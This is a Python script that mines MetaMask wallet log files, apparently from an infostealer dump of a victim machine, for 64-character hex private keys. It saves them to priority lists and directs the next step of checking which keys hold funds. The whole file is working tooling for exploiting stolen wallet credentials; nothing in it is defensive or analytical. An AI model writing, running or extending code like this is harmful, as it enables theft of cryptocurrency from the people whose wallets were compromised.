#!/usr/bin/env python3

import json
import time
import os
from datetime import datetime

def extract_from_richest_sources():
    """Extract private keys directly from the richest source files"""
    
    print("🎯 EXTRACTING FROM RICHEST SOURCE FILES")
    print("="*60)
    
    # Priority files (highest key counts) - MetaMask wallet logs
    priority_files = [
        "/home/admin/Downloads/net605/[AR]181.98.227.167/Wallets/MetaMask_Chrome_Default/210226.log",  # 122,235 keys
        "/home/admin/Downloads/net605/[AR]181.98.227.167/Wallets/MetaMask_Chrome_Default/210223.log",  # 122,233 keys  
        "/home/admin/Downloads/net605/[AR]181.98.227.167/Wallets/MetaMask_Chrome_Default/214930.log",  # 122,233 keys
        "/home/admin/Downloads/net605/[AR]181.98.227.167/Wallets/MetaMask_Chrome_Default/210098.log",  # 93,279 keys
    ]
    
    extracted_keys = {}
    
    for file_path in priority_files:
        filename = os.path.basename(file_path)
        print(f"\n🔍 EXTRACTING FROM: {filename}")
        
        try:
            if not os.path.exists(file_path):
                print(f"   ❌ File not found: {file_path}")
                continue
            
            file_size = os.path.getsize(file_path) / (1024*1024)  # MB
            print(f"   📊 File size: {file_size:.1f} MB")
            
            if file_size > 100:  # Skip very large files for now
                print(f"   ⚠️  Skipping large file (>{file_size:.1f}MB) - will process separately")
                continue
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Extract 64-character hex keys
            import re
            hex_keys = re.findall(r'\b[a-fA-F0-9]{64}\b', content)
            
            # Validate and deduplicate
            valid_keys = []
            for key in hex_keys:
                # Basic validation - not all zeros or all same character
                if key != '0' * 64 and not all(c == key[0] for c in key) and len(set(key)) > 4:
                    valid_keys.append(key.lower())
            
            # Remove duplicates but keep order
            unique_keys = []
            seen = set()
            for key in valid_keys:
                if key not in seen:
                    unique_keys.append(key)
                    seen.add(key)
            
            extracted_keys[filename] = unique_keys[:1000]  # First 1000 unique keys per file
            
            print(f"   ✅ Extracted {len(unique_keys)} unique keys (saved first 1000)")
            
        except Exception as e:
            print(f"   ❌ Error processing {filename}: {str(e)}")
            continue
    
    # Save extracted keys by priority
    priority_keys_data = {
        'extraction_date': datetime.now().isoformat(),
        'source': 'richest_log_files',
        'total_files_processed': len(extracted_keys),
        'files': extracted_keys
    }
    
    with open('PRIORITY_RICHEST_KEYS.json', 'w') as f:
        json.dump(priority_keys_data, f, indent=2)
    
    # Create combined priority list for immediate checking
    all_priority_keys = []
    for filename, keys in extracted_keys.items():
        for key in keys[:250]:  # Top 250 keys per file
            all_priority_keys.append({
                'private_key': key,
                'source_file': filename
            })
    
    print(f"\n📊 EXTRACTION SUMMARY:")
    print(f"   📁 Files processed: {len(extracted_keys)}")
    total_keys = sum(len(keys) for keys in extracted_keys.values())
    print(f"   🔑 Total keys extracted: {total_keys}")
    print(f"   🎯 Priority keys for checking: {len(all_priority_keys)}")
    
    # Save priority checking list
    with open('PRIORITY_CHECKING_LIST.json', 'w') as f:
        json.dump({
            'creation_date': datetime.now().isoformat(),
            'description': 'Priority keys from richest log files',
            'total_keys': len(all_priority_keys),
            'keys': all_priority_keys
        }, f, indent=2)
    
    print(f"\n💾 Files created:")
    print(f"   📄 PRIORITY_RICHEST_KEYS.json - Full extraction results") 
    print(f"   📄 PRIORITY_CHECKING_LIST.json - {len(all_priority_keys)} keys ready for balance checking")
    
    if all_priority_keys:
        print(f"\n🚀 NEXT STEPS:")
        print(f"   1. Install crypto library: pip install eth-keys bit")
        print(f"   2. Run proper balance check on {len(all_priority_keys)} priority keys")
        print(f"   3. These keys from .log files have highest probability of being funded")
        
        # Show sample of priority keys
        print(f"\n📋 SAMPLE PRIORITY KEYS:")
        for i, key_data in enumerate(all_priority_keys[:10], 1):
            print(f"   {i:2d}. {key_data['private_key'][:12]}... ({key_data['source_file']})")
    
    return len(all_priority_keys)

if __name__ == "__main__":
    count = extract_from_richest_sources()
    if count > 0:
        print(f"\n🎯 PRIORITY: Check {count} keys from richest log files!")
        print(f"   These are the most promising keys in our entire dataset!")
